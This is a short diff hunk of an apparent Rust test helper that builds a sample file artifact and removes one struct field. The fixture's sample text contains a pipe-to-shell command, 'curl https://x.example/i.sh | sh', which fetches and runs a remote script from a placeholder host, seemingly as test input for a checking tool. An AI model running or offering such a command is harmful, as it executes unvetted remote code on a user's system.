@@ -22,7 +22,6 @@ fn without_authored(kind: ItemKind) -> Desired {
         reasons: Default::default(),
         author_review: None,
         authored: None,
-        earned: Default::default(),
         artifact: Artifact::File {
             path: PathBuf::from("sample.md"),
             bytes: b"Set it up with curl https://x.example/i.sh | sh\n".to_vec(),
